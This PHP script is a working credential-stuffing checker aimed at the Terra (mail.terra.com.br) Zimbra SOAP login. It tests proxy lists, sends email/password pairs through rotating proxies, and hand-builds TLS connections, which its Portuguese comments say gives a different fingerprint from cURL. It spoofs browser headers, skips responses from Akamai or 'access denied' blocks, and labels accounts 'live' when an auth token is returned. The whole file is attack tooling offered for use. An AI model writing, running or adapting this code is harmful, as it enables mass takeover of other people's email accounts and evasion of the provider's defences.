<?php
define('CRLF', chr(13) . chr(10));
define('LF', chr(10));
define('DQ', chr(34));

while (ob_get_level() > 0) { @ob_end_clean(); }
ob_start();

error_reporting(0);
ini_set('display_errors', '0');
ini_set('display_startup_errors', '0');
ini_set('log_errors', '0');
ini_set('max_execution_time', '120');

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

$action = isset($_GET['action']) ? $_GET['action'] : '';

if ($action === 'init') {
    $proxies = array();
    $proxyFile = __DIR__ . '/proxies.txt';
    if (file_exists($proxyFile)) {
        $content = @file_get_contents($proxyFile);
        $lines = array_filter(array_map('trim', explode(LF, $content)));
        foreach ($lines as $line) {
            if (empty($line) || $line[0] === '#') continue;
            $proxies[] = $line;
        }
    }
    ob_end_clean();
    echo json_encode(array('status' => 'ok', 'proxies' => array_values(array_unique($proxies))));
    exit;
}

if ($action === 'test_proxy') {
    $proxy = isset($_POST['proxy']) ? $_POST['proxy'] : '';
    if (empty($proxy)) {
        ob_end_clean();
        echo json_encode(array('status' => 'fail'));
        exit;
    }
    $ok = testProxy($proxy);
    ob_end_clean();
    echo json_encode(array('status' => $ok ? 'ok' : 'fail'));
    exit;
}

if ($action === 'diag_check') {
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $proxy = isset($_POST['proxy']) ? $_POST['proxy'] : '';
    $diag = array('email' => $email, 'methods' => array());

    $diag['methods']['soap_manual_proxy'] = diagSoapManualProxy($email, $password, $proxy, 20);
    $diag['methods']['soap_curl_direct'] = diagSoapCurl($email, $password, '', 20);
    $diag['methods']['soap_curl_proxy'] = diagSoapCurl($email, $password, $proxy, 20);

    ob_end_clean();
    echo json_encode($diag, JSON_PRETTY_PRINT);
    exit;
}

if ($action === 'check') {
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $proxy = isset($_POST['proxy']) ? $_POST['proxy'] : '';
    if (empty($email) || empty($password)) {
        ob_end_clean();
        echo json_encode(array('status' => 'die', 'email' => $email, 'reason' => 'Vazio'));
        exit;
    }
    try {
        $result = doValidate($email, $password, $proxy);
    } catch (\Throwable $e) {
        $result = array('status' => 'die', 'email' => $email, 'reason' => 'Erro');
    }
    ob_end_clean();
    echo json_encode($result);
    exit;
}

ob_end_clean();
echo json_encode(array('status' => 'ok'));
exit;

function parseProxy($proxy) {
    $host = ''; $port = 0; $user = ''; $pass = ''; $type = 'http';
    $lower = strtolower($proxy);
    if (strpos($lower, 'socks5') === 0) $type = 'socks5';
    elseif (strpos($lower, 'socks4') === 0) $type = 'socks4';
    if (preg_match('#^(socks[45]h?|https?)://([^:@]+):([^@]+)@([^:]+):(\d+)$#i', $proxy, $m)) {
        $user = $m[2]; $pass = $m[3]; $host = $m[4]; $port = (int)$m[5];
    } elseif (preg_match('#^([^:@]+):([^@]+)@([^:]+):(\d+)$#', $proxy, $m)) {
        $user = $m[1]; $pass = $m[2]; $host = $m[3]; $port = (int)$m[4];
    } elseif (preg_match('#^(socks[45]h?|https?)://([^:]+):(\d+)$#i', $proxy, $m)) {
        $host = $m[2]; $port = (int)$m[3];
    } elseif (preg_match('#^([^:]+):(\d+)$#', $proxy, $m)) {
        $host = $m[1]; $port = (int)$m[2];
    }
    return array('host' => $host, 'port' => $port, 'user' => $user, 'pass' => $pass, 'type' => $type);
}

function testProxy($proxy) {
    if (!extension_loaded('curl')) return false;
    $p = parseProxy($proxy);
    if (empty($p['host'])) return false;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_PROXY, $p['host'] . ':' . $p['port']);
    if ($p['type'] === 'socks5') {
        curl_setopt($ch, CURLOPT_PROXYTYPE, 7);
    } else {
        curl_setopt($ch, CURLOPT_PROXYTYPE, 0);
        curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
    }
    if (!empty($p['user'])) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $p['user'] . ':' . $p['pass']);
    }
    $result = curl_exec($ch);
    curl_close($ch);
    return ($result !== false && strlen(trim($result)) > 0);
}

function buildSoapRequest($email, $password) {
    $safe_email = htmlspecialchars($email, ENT_XML1);
    $safe_pass = htmlspecialchars($password, ENT_XML1);
    return '<?xml version="1.0" encoding="UTF-8"?>' .
        '<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">' .
        '<soap:Body>' .
        '<AuthRequest xmlns="urn:zimbraAccount">' .
        '<account by="name">' . $safe_email . '</account>' .
        '<password>' . $safe_pass . '</password>' .
        '</AuthRequest>' .
        '</soap:Body>' .
        '</soap:Envelope>';
}

function parseZimbraResult($body, $code, $email) {
    if (empty($body)) return null;
    $lower = strtolower($body);

    if ($code === 403 || $code === 401) return null;
    if (strpos($lower, '<html') !== false) return null;
    if (strpos($lower, 'access denied') !== false) return null;
    if (strpos($lower, 'akamai') !== false) return null;

    if (strpos($lower, 'authtoken') !== false && strpos($lower, 'soap:fault') === false) {
        return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
    }

    if (strpos($lower, 'soap:fault') !== false || strpos($lower, 'faultcode') !== false) {
        if (strpos($lower, 'auth') !== false || strpos($lower, 'password') !== false || strpos($lower, 'account') !== false) {
            return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
        }
        return null;
    }

    return null;
}

// =========================================
//  SOAP via HTTP CONNECT manual + TLS PHP
//  Usa stream_socket_enable_crypto em vez de cURL
//  Fingerprint TLS diferente do cURL
// =========================================
function trySoapManualProxy($email, $password, $timeout, $proxy) {
    $p = parseProxy($proxy);
    if (empty($p['host']) || empty($p['port'])) return null;

    // 1. TCP ao proxy
    $socket = @fsockopen($p['host'], $p['port'], $errno, $errstr, $timeout);
    if ($socket === false) return null;
    stream_set_timeout($socket, $timeout);
    stream_set_blocking($socket, true);

    // 2. HTTP CONNECT para mail.terra.com.br:443
    $target = 'mail.terra.com.br';
    $req = 'CONNECT ' . $target . ':443 HTTP/1.1' . CRLF;
    $req .= 'Host: ' . $target . ':443' . CRLF;
    $req .= 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' . CRLF;
    if (!empty($p['user'])) {
        $auth = base64_encode($p['user'] . ':' . $p['pass']);
        $req .= 'Proxy-Authorization: Basic ' . $auth . CRLF;
    }
    $req .= 'Proxy-Connection: Keep-Alive' . CRLF . CRLF;
    fwrite($socket, $req);

    // 3. Ler resposta do CONNECT
    $resp = '';
    $deadline = microtime(true) + $timeout;
    while (!feof($socket) && microtime(true) < $deadline) {
        $line = @fgets($socket, 8192);
        if ($line === false) { usleep(50000); continue; }
        $resp .= $line;
        if ($line === CRLF || $line === LF) break;
    }
    if (stripos($resp, '200') === false) { fclose($socket); return null; }

    // 4. TLS via stream_socket_enable_crypto (fingerprint diferente do cURL)
    $cryptoOk = false;
    $deadline2 = microtime(true) + $timeout;
    while (microtime(true) < $deadline2) {
        $r = @stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
        if ($r === true) { $cryptoOk = true; break; }
        if ($r === false) break;
        usleep(100000);
    }
    if (!$cryptoOk) { fclose($socket); return null; }

    // 5. Enviar HTTP POST com SOAP XML
    $soapXml = buildSoapRequest($email, $password);
    $httpReq = 'POST /service/soap/ HTTP/1.1' . CRLF;
    $httpReq .= 'Host: ' . $target . CRLF;
    $httpReq .= 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' . CRLF;
    $httpReq .= 'Accept: application/soap+xml, text/xml, */*' . CRLF;
    $httpReq .= 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7' . CRLF;
    $httpReq .= 'Content-Type: application/soap+xml; charset=utf-8' . CRLF;
    $httpReq .= 'Content-Length: ' . strlen($soapXml) . CRLF;
    $httpReq .= 'Connection: close' . CRLF;
    $httpReq .= 'Origin: https://' . $target . CRLF;
    $httpReq .= 'Referer: https://' . $target . '/' . CRLF;
    $httpReq .= CRLF;
    $httpReq .= $soapXml;

    fwrite($socket, $httpReq);

    // 6. Ler resposta HTTP completa
    $rawResponse = '';
    $deadline3 = microtime(true) + $timeout;
    $headersDone = false;
    $body = '';
    $contentLength = 0;

    while (!feof($socket) && microtime(true) < $deadline3) {
        $line = @fgets($socket, 8192);
        if ($line === false) { usleep(50000); continue; }
        $rawResponse .= $line;

        if (!$headersDone) {
            if (preg_match('/Content-Length:\s*(\d+)/i', $line, $cm)) {
                $contentLength = (int)$cm[1];
            }
            if ($line === CRLF || $line === LF) {
                $headersDone = true;
            }
        } else {
            $body .= $line;
            if ($contentLength > 0 && strlen($body) >= $contentLength) break;
        }
    }
    fclose($socket);

    // Extrair HTTP status code
    $code = 0;
    if (preg_match('/HTTP\/[\d.]+\s+(\d+)/', $rawResponse, $sm)) {
        $code = (int)$sm[1];
    }

    return parseZimbraResult($body, $code, $email);
}

function trySoapCurl($email, $password, $timeout, $proxy) {
    if (!extension_loaded('curl')) return null;
    $soapXml = buildSoapRequest($email, $password);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://mail.terra.com.br/service/soap/');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $soapXml);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/soap+xml; charset=utf-8',
        'Accept: application/soap+xml, text/xml, */*',
        'Accept-Language: pt-BR,pt;q=0.9',
        'Origin: https://mail.terra.com.br',
        'Referer: https://mail.terra.com.br/',
    ));
    if (!empty($proxy)) {
        $p = parseProxy($proxy);
        curl_setopt($ch, CURLOPT_PROXY, $p['host'] . ':' . $p['port']);
        if ($p['type'] === 'socks5') {
            curl_setopt($ch, CURLOPT_PROXYTYPE, 7);
        } else {
            curl_setopt($ch, CURLOPT_PROXYTYPE, 0);
            curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
        }
        if (!empty($p['user'])) {
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $p['user'] . ':' . $p['pass']);
        }
    }

    $result = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return parseZimbraResult($result, $code, $email);
}

function doValidate($email, $password, $proxy) {
    $timeout = 20;
    $delays = array(0, 2000000, 4000000, 7000000, 10000000);

    for ($attempt = 0; $attempt < 5; $attempt++) {
        if ($delays[$attempt] > 0) usleep($delays[$attempt]);

        // Metodo 1: SOAP via HTTP CONNECT manual + TLS PHP (proxy)
        if (!empty($proxy)) {
            $r = trySoapManualProxy($email, $password, $timeout, $proxy);
            if ($r !== null) return $r;
        }

        // Metodo 2: SOAP via cURL direto (sem proxy)
        if (extension_loaded('curl')) {
            $r = trySoapCurl($email, $password, $timeout, '');
            if ($r !== null) return $r;
        }

        // Metodo 3: SOAP via cURL com proxy
        if (!empty($proxy) && extension_loaded('curl')) {
            $r = trySoapCurl($email, $password, $timeout, $proxy);
            if ($r !== null) return $r;
        }
    }

    return array('status' => 'die', 'email' => $email, 'reason' => 'Connection failed', 'retry_exhausted' => true);
}

function diagSoapManualProxy($email, $password, $proxy, $timeout) {
    $p = parseProxy($proxy);
    if (empty($p['host']) || empty($p['port'])) {
        return array('ok' => false, 'err' => 'Parse failed');
    }

    $t0 = microtime(true);
    $socket = @fsockopen($p['host'], $p['port'], $errno, $errstr, $timeout);
    if ($socket === false) {
        return array('ok' => false, 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => sprintf('fsockopen: %s (%d)', $errstr, $errno));
    }
    stream_set_timeout($socket, $timeout);

    $target = 'mail.terra.com.br';
    $req = 'CONNECT ' . $target . ':443 HTTP/1.1' . CRLF;
    $req .= 'Host: ' . $target . ':443' . CRLF;
    if (!empty($p['user'])) {
        $auth = base64_encode($p['user'] . ':' . $p['pass']);
        $req .= 'Proxy-Authorization: Basic ' . $auth . CRLF;
    }
    $req .= CRLF;
    fwrite($socket, $req);

    $resp = '';
    $deadline = microtime(true) + $timeout;
    while (!feof($socket) && microtime(true) < $deadline) {
        $line = @fgets($socket, 8192);
        if ($line === false) { usleep(50000); continue; }
        $resp .= $line;
        if ($line === CRLF || $line === LF) break;
    }

    if (stripos($resp, '200') === false) {
        fclose($socket);
        return array('ok' => false, 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => 'CONNECT rejected', 'response' => substr($resp, 0, 300));
    }

    $tls = false;
    $deadline2 = microtime(true) + $timeout;
    while (microtime(true) < $deadline2) {
        $r = @stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
        if ($r === true) { $tls = true; break; }
        if ($r === false) break;
        usleep(100000);
    }

    if (!$tls) {
        fclose($socket);
        return array('ok' => false, 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => 'TLS failed');
    }

    $soapXml = buildSoapRequest($email, $password);
    $httpReq = 'POST /service/soap/ HTTP/1.1' . CRLF;
    $httpReq .= 'Host: ' . $target . CRLF;
    $httpReq .= 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' . CRLF;
    $httpReq .= 'Accept: application/soap+xml, text/xml, */*' . CRLF;
    $httpReq .= 'Content-Type: application/soap+xml; charset=utf-8' . CRLF;
    $httpReq .= 'Content-Length: ' . strlen($soapXml) . CRLF;
    $httpReq .= 'Connection: close' . CRLF;
    $httpReq .= CRLF;
    $httpReq .= $soapXml;

    fwrite($socket, $httpReq);

    $rawResponse = '';
    $deadline3 = microtime(true) + $timeout;
    while (!feof($socket) && microtime(true) < $deadline3) {
        $line = @fgets($socket, 8192);
        if ($line === false) { usleep(50000); continue; }
        $rawResponse .= $line;
    }
    fclose($socket);

    $timeMs = round((microtime(true) - $t0) * 1000);
    $code = 0;
    if (preg_match('/HTTP\/[\d.]+\s+(\d+)/', $rawResponse, $sm)) {
        $code = (int)$sm[1];
    }

    return array(
        'ok' => strlen($rawResponse) > 0,
        'http_code' => $code,
        'time_ms' => $timeMs,
        'response' => substr($rawResponse, 0, 1000),
    );
}

function diagSoapCurl($email, $password, $proxy, $timeout) {
    if (!extension_loaded('curl')) return array('ok' => false, 'err' => 'no curl');

    $soapXml = buildSoapRequest($email, $password);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://mail.terra.com.br/service/soap/');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $soapXml);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/soap+xml; charset=utf-8',
        'Accept: application/soap+xml, text/xml, */*',
    ));
    if (!empty($proxy)) {
        $p = parseProxy($proxy);
        curl_setopt($ch, CURLOPT_PROXY, $p['host'] . ':' . $p['port']);
        if ($p['type'] === 'socks5') {
            curl_setopt($ch, CURLOPT_PROXYTYPE, 7);
        } else {
            curl_setopt($ch, CURLOPT_PROXYTYPE, 0);
            curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
        }
        if (!empty($p['user'])) {
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $p['user'] . ':' . $p['pass']);
        }
    }

    $t0 = microtime(true);
    $result = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $err = curl_error($ch);
    curl_close($ch);
    $timeMs = round((microtime(true) - $t0) * 1000);

    return array(
        'ok' => $result !== false,
        'http_code' => $code,
        'time_ms' => $timeMs,
        'err' => $err,
        'response' => $result !== false ? substr($result, 0, 500) : null,
    );
}
